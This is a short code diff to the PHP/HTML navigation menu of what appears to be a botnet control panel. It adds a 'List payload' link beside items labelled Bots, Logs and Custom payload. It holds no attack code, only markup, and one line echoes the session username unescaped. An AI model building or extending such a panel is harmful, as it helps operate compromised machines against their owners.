@@ -3,6 +3,7 @@
       <a href="index.php?action=bots" class="item">Bots</a>
       <a href="index.php?action=panel" class="active item">Logs</a>
       <a href="index.php?action=payload" class="item">Custom payload</a>
+      <a href="index.php?action=listpayload" class="item">List payload</a>
       <a href="logout.php" class="item">Logout</a>
       <div class="right menu">
         <a class="item">Welcome <?php echo $_SESSION['username']; ?></a>
